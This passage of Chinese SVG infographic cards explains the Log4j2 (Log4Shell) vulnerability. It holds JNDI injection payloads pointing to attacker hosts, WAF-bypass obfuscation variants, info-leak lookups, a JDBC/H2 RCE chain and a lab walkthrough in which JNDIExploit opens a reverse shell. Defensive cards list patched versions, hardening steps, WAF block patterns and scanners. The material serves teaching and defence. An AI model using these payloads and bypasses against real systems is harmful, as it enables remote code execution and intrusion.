  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🎯 常见注入点位置 Top10</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">URL 参数 /?q=${jndi}</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">User-Agent 请求头</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">X-Forwarded-For 真实IP</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Referer 来源页</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">登录表单 username 字段</text>
  <rect x="540" y="163" width="220" height="55" rx="10" fill="#ecfeff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">搜索关键字 search 参数</text>
  <rect x="60" y="236" width="220" height="55" rx="10" fill="#fef2f2" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="268.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Cookie 自定义值</text>
  <rect x="300" y="236" width="220" height="55" rx="10" fill="#f0f9ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="268.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">POST Body JSON 任意字段</text>
  <rect x="540" y="236" width="220" height="55" rx="10" fill="#faf5ff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="268.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Accept-Language 语言头</text>
  <rect x="60" y="309" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="341.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">所有进入 log.info/error() 的输入</text>
</svg>

<svg width="800" height="309" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 309">
  <defs><linearGradient id="g8jgaedlp" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="309" rx="12" fill="url(#g8jgaedlp)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#4c1d95" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🧰 JNDIExploit 工具功能矩阵</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">LDAP服务 1389端口</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">HTTP服务 8080 恶意class</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">RMI服务 1099端口</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">BasicInfo 泄露环境变量</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">ByPassJDK8u191 TomcatEL</text>
  <rect x="540" y="163" width="220" height="55" rx="10" fill="#ecfeff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">SpringMVC内存马注入</text>
  <rect x="60" y="236" width="220" height="55" rx="10" fill="#fef2f2" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="268.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Tomcat Listener内存马</text>
  <rect x="300" y="236" width="220" height="55" rx="10" fill="#f0f9ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="268.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Websphere 绕过链 + Resin利用</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="gv6szailu" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#gv6szailu)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#075985" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">📊 JDK版本 vs 利用成功率</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">JDK 6/7 早期: 出网100% 成功</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">JDK 8u121-: RMI trustURLCodebase=false</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">JDK 8u191+: LDAP 远程ObjectFactory白名单</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">高版本 JDK → 本地BeanFactory/TomcatEL绕过</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">JDK 11+ → 依赖Groovy/Spring Boot 本地链</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="gnanexl1w" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#gnanexl1w)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#92400e" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🛞 Log4j2 三条利用链对比</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">链1 JNDI远程链: 出网+低JDK 最通用</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">链2 JDBC RCE: 2.17 CVE-2021-44832</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">链3 RASP绕过: 反序列化 纯本地链</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">链4 XXE: 已修复版 少见 信息泄露</text>
</svg>

<svg width="800" height="309" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 309">
  <defs><linearGradient id="gesl33xju" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="309" rx="12" fill="url(#gesl33xju)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#0e7490" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🐱‍💻 信息泄露探测 (不出网 必用)</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">${java:version} → JDK版本号</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">${java:runtime} → JRE详细版本</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">${env:USER} → 系统用户名</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">${env:PATH} → 系统PATH环境</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">${sys:user.home} → 家目录</text>
  <rect x="540" y="163" width="220" height="55" rx="10" fill="#ecfeff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">${sys:user.dir} → 当前工作目录</text>
  <rect x="60" y="236" width="220" height="55" rx="10" fill="#fef2f2" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="268.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">${sys:os.name} → 操作系统名</text>
  <rect x="300" y="236" width="220" height="55" rx="10" fill="#f0f9ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="268.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">${log4j:configLocation} → 配置文件路径</text>
</svg>

<svg width="800" height="309" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 309">
  <defs><linearGradient id="ghvyn1dja" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="309" rx="12" fill="url(#ghvyn1dja)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#b45309" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🚧 WAF绕过8大变形姿势</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">① 大小写混合 ${JNDI:LDAP}</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">② ${lower:j} 拆分拼接</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">③ ${::-j} 空替换绕过</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">④ Unicode转义 \u0024\u007b</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">⑤ URL双重编码 %2524%257b</text>
  <rect x="540" y="163" width="220" height="55" rx="10" fill="#ecfeff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">⑥ 嵌套多层 ${${a:-j}ndi}</text>
  <rect x="60" y="236" width="220" height="55" rx="10" fill="#fef2f2" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="268.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">⑦ 多余空格换行干扰</text>
  <rect x="300" y="236" width="220" height="55" rx="10" fill="#f0f9ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="268.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">⑧ Content-Type/多参数混合注入</text>
</svg>

<svg width="800" height="309" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 309">
  <defs><linearGradient id="gqx3ghjwt" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="309" rx="12" fill="url(#gqx3ghjwt)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#7c2d12" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🏗️ JNDI注入全链路示意图</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Step1: 目标服务 log.info() 用户输入</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Step2: StrSubstitutor 解析 ${jndi:ldap://evil}</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Step3: JndiLookup → InitialContext.lookup()</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Step4: 目标发LDAP请求到攻击者VPS</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Step5: LDAP返回 Reference 含 http://evil/Exp.class</text>
  <rect x="540" y="163" width="220" height="55" rx="10" fill="#ecfeff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Step6: JDK去HTTP下载Exp.class字节码</text>
  <rect x="60" y="236" width="220" height="55" rx="10" fill="#fef2f2" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="268.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Step7: defineClass + newInstance() 实例化</text>
  <rect x="300" y="236" width="220" height="55" rx="10" fill="#f0f9ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="268.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Step8: 恶意类static代码块执行 → RCE</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="g9qjqpl40" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#g9qjqpl40)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#166534" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🔐 Log4j2 修复版本差异表</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">2.15.0-rc1 初修 仍有绕过 不推荐</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">2.15.0 正式 修CVE-44228 仍有45046</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">2.16.0 禁JNDI 禁用MessageLookup 仍有45105</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">2.17.0 修45105 DoS 仍有44832</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">2.17.1 修44832 JDBC RCE → 推荐最终版</text>
  <rect x="540" y="163" width="220" height="55" rx="10" fill="#ecfeff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">2.17.2+ Java 8/11+ 长期稳定</text>
</svg>

<svg width="800" height="309" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 309">
  <defs><linearGradient id="gq4sug5hu" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="309" rx="12" fill="url(#gq4sug5hu)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#166534" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🛡️ 加固方案 7件套</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">① 升级 log4j-core 至 2.17.1 (2.17.2+)</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">② JVM参数: -Dlog4j2.formatMsgNoLookups=true (仅旧版)</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">③ 系统环境: LOG4J_FORMAT_MSG_NO_LOOKUPS=true</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">④ 移除 JndiLookup.class 类: zip -q -d log4j-core*.jar</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">⑤ WAF规则: 拦截 ${jndi: ${lower: ${::-j}</text>
  <rect x="540" y="163" width="220" height="55" rx="10" fill="#ecfeff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">⑥ RASP Agent 拦截: JndiLookup / InitialContext.lookup</text>
  <rect x="60" y="236" width="220" height="55" rx="10" fill="#fef2f2" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="268.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">⑦ 出口防火墙: 禁止服务器主动出网LDAP/RMI/HTTP非白名单</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="g05dyo9il" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#g05dyo9il)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#0f172a" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">📡 扫描检测工具 全家桶</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">log4j2-scan (logpresso) 本地jar扫描</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Burp Log4jScanner 插件 主动+被动</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Nuclei templates/cves/2021/CVE-2021-44228</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">log4j-scan.py (fullhunt.io) 批量</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">JNDIExploit-1.3-SNAPSHOT.jar 利用端</text>
  <rect x="540" y="163" width="220" height="55" rx="10" fill="#ecfeff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">GitHub 全网扫描 仓库公开名单</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="g46tvsuuf" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#g46tvsuuf)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#4c1d95" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🧱 CVE-2021-44832 JDBC RCE链</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">影响版本: 2.0-beta7 ~ 2.17.0 (不含2.17.1)</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">前提: 攻击者可控log4j2.xml配置文件</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">AppenderType=JDBC + dataSource JNDI</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">恶意JDBC URL: jdbc:h2:mem:;MODE=MSSQLServer;...</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">INIT=CREATE ALIAS SHELLEXEC AS ~//~  → RCE</text>
  <rect x="540" y="163" width="220" height="55" rx="10" fill="#ecfeff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">h2 内存数据库 + 自定义 alias → 任意命令执行</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="gqwm86lnm" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#gqwm86lnm)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#1e40af" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">⚡ 实战SpringBoot+Log4j2案例</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">① 靶机: vulhub/log4j CVE-2021-44228 8080端口</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">② 注入点: /solr/admin/cores?action= 参数</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">③ DNSLog盲打: ${jndi:dns://xxx.dnslog.cn/name} → 命中</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">④ JNDIExploit启动: java -jar JNDIExploit.jar -i VPS_IP</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">⑤ Payload: ${jndi:ldap://VPS:1389/Basic/Command/Base64/xxx}</text>
  <rect x="540" y="163" width="220" height="55" rx="10" fill="#ecfeff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">⑥ 目标: Base64反弹bash编码命令 成功上线CS</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="gecqtp06w" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#gecqtp06w)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#0e7490" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">🧠 面试：为什么Log4j2能打穿几乎全行业？</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">① Java生态占比高: 企业服务90%用Java</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">② Log4j2几乎是Java项目标配日志组件</text>
  <rect x="540" y="90" width="220" height="55" rx="10" fill="#fef3c7" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">③ 漏洞触发极其简单: 任何可被记录日志的用户输入</text>
  <rect x="60" y="163" width="220" height="55" rx="10" fill="#fce7f3" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">④ Lookup机制默认开启 无任何权限校验</text>
  <rect x="300" y="163" width="220" height="55" rx="10" fill="#f5f3ff" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">⑤ 影响面广: SpringBoot/Apache/Minecraft/苹果iCloud/Steam全中招</text>
  <rect x="540" y="163" width="220" height="55" rx="10" fill="#ecfeff" stroke="#64748b" stroke-width="2"/>
  <text x="650" y="195.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">⑥ 历史上最严重漏洞之一: CVSS 10.0 满分</text>
</svg>

<svg width="800" height="236" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 236">
  <defs><linearGradient id="gphfgbf18" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#eff6ff"/><stop offset="100%" stop-color="#dbeafe"/></linearGradient></defs>
  <rect x="0" y="0" width="800" height="236" rx="12" fill="url(#gphfgbf18)"/>
  <rect x="12" y="12" width="776" height="44" rx="8" fill="#0369a1" opacity="0.88"/>
  <text x="400" y="40" text-anchor="middle" fill="#ffffff" font-weight="bold" font-size="18">📚 Log4j2 核心组件架构</text>
  <rect x="60" y="90" width="220" height="55" rx="10" fill="#eff6ff" stroke="#64748b" stroke-width="2"/>
  <text x="170" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">Logger: 应用代码调用入口</text>
  <rect x="300" y="90" width="220" height="55" rx="10" fill="#f0fdf4" stroke="#64748b" stroke-width="2"/>
  <text x="410" y="122.5" text-anchor="middle" fill="#334155" font-weight="600" font-size="12">LoggerConfig: 日志级别/过滤器/Appender引用</text>
